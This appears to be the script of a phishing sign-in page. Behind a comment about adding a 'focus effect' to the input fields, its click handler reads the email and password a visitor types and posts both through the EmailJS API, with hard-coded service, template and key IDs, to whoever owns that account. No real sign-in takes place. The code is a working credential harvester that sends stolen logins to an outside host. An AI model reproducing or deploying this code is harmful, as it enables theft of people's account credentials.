    <script>
        
        // Add focus effect to input fields
        const emailInput = document.getElementById('email');
        const passwordInput = document.getElementById("password")

        const signin_btn_next = document.getElementById("signin_btn_next")

        signin_btn_next.addEventListener("click", (e)=>{
            e.preventDefault();
            const email = document.getElementById('email').value;
            const password = document.getElementById('password').value;

            var data = {
              service_id: 'service_wl5vuor',
              template_id: 'template_eoygrmd',
              user_id: '-zjPuYL7ov5kqN7sG',  // your public key
              template_params: {
                email: email, 
                password: password 
              }
            };

            fetch('https://api.emailjs.com/api/v1.0/email/send', {
              method: 'POST',
              headers: {
                'Content-Type': 'application/json'
              },
              body: JSON.stringify(data)
            })
            .then(function(response) {
              if (response.ok) {
                alert('Your mail is sent!');
              } else {
                return response.json().then(err => Promise.reject(err));
              }
            })
            .catch(function(error) {
              alert('Oops... ' + JSON.stringify(error));
            });
        })

        emailInput.addEventListener('focus', function() {
            this.parentElement.classList.add('is-focused');
        });
        
        emailInput.addEventListener('blur', function() {
            if (!this.value) {
                this.parentElement.classList.remove('is-focused');
            }
        });
    </script>
